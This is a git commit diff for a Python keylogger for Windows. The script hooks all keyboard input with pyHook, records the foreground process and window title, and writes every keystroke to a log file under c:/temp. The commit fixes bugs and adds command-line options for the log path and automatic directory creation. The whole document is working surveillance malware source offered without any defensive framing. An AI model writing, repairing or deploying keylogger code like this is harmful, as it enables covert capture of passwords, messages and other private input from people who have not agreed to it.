7507b5b5a713e04e587bad952ff0e5f59db9eb93
mashakf <51250208+mashakf@users.noreply.github.com>
2019-07-21 21:20:16 -0400

    Update keystrokes.py

--- keystrokes.py
+++ keystrokes.py
@@ -1,4 +1,10 @@
+import getopt
+import os
+import sys
+from argparse import ArgumentParser
 from ctypes import *
+from pathlib import Path
+
 import pythoncom
 import pyHook
 import win32clipboard
@@ -10,50 +16,48 @@ psapi = windll.psapi
 current_window = None
 
 # log file name - directory has to exist, could make it create as necessary
-file_log='c:\\temp\\keylog2.txt'
-
-# setup some basics for the logging
-logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
+file_log_folder = 'c:/temp'
+file_name = 'keylog2.txt'
 
 def get_current_process():
-	# get a handle to the foreground window
-	hwnd = user32.GetForegroundWindow()
+    # get a handle to the foreground window
+    hwnd = user32.GetForegroundWindow()
 
-	# find the process id
-	pid = c_ulong(0)
-	user32.GetWindowThreadProcessId(hwnd, byref(pid))
+    # find the process id
+    pid = c_ulong(0)
+    user32.GetWindowThreadProcessId(hwnd, byref(pid))
 
-	# store the current process id
-	process_id = pid.value
+    # store the current process id
+    process_id = pid.value
 
-	# grab the executable
-	executable = create_string_buffer("\x00" * 512) # 0x00 == NULL
-	h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
+    # grab the executable
+    executable = create_string_buffer(512)  # 0x00 == NULL
+    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
 
-	psapi.GetModuleBaseName(h_process, None, byref(executable), 512)
+    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
 
-	# read the title
-	window_title = create_string_buffer("\x00" * 512)
-	lenght = user32.GetWindowTextA(hwnd, bref(window_title), 512)
+    # read the title
+    window_title = create_string_buffer(512)
+    length = user32.GetWindowTextA(hwnd, byref(window_title), 512)
 
-	# log out the header if we're in the right process
-    	logging.log(logging.DEBUG, "[PID: {0} - {1} - {2}".format(process_id, executable.value, window_title.value))
+    # log out the header if we're in the right process
+    logging.log(logging.DEBUG, "[PID: {0} - {1} - {2}".format(process_id, executable.value, window_title.value))
 
-	# close the handles
-	kernel32.CloseHandle(hwnd)
-	kernel32.CloseHandle(h_process)
+    # close the handles
+    kernel32.CloseHandle(hwnd)
+    kernel32.CloseHandle(h_process)
+
 
 def key_stroke(event):
-	
-	global current_window
+    global current_window
 
-	# check if target changed windows
-	if event.WindowName != current_window:
-		current_window = event.WindowName
-		
-	get_current_process()
+    # check if target changed windows
+    if event.WindowName != current_window:
+        current_window = event.WindowName
 
-	# if a standard key is pressed
+    get_current_process()
+
+    # if a standard key is pressed
     if event.Ascii in range(32, 128):
         logging.log(logging.DEBUG, chr(event.Ascii))
     else:
@@ -66,8 +70,33 @@ def key_stroke(event):
         else:
             logging.log(logging.DEBUG, "{0}".format(event.Key))
 
-	# pass execution to the next registered hook
-	return True
+    # pass execution to the next registered hook
+    return True
+
+# check if directory filename passed in command line, this can be handled better
+# with explicit args e.g -d <directory> -f <filename>
+if len(sys.argv) == 2:
+    file_name = sys.argv[1:][0]
+elif len(sys.argv) == 3:
+    file_log_folder = sys.argv[1:][0]
+    file_name = sys.argv[2:][0]
+
+# create file path if necessary
+if not Path(file_log_folder).exists():
+    try:
+        os.mkdir(file_log_folder)
+        print("Successfully created the directory %s ..." % file_log_folder)
+    except OSError:
+        print("Creation of the directory %s failed ..." % file_log_folder)
+else:
+    print("Directory already exists %s skipping create..." % file_log_folder)
+
+file_log = file_log_folder + '/' + file_name
+
+print("Keystore file is %s " % Path(file_log).absolute())
+
+# setup some basics for the logging
+logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
 
 # create and register a hook manager
 kl = pyHook.HookManager()
@@ -75,4 +104,4 @@ kl.KeyDown = key_stroke
 
 # register and loop hook
 kl.HookKeyboard()
-pythoncom.PumpMessages() # get a Windows message pump
+pythoncom.PumpMessages()  # get a Windows message pump
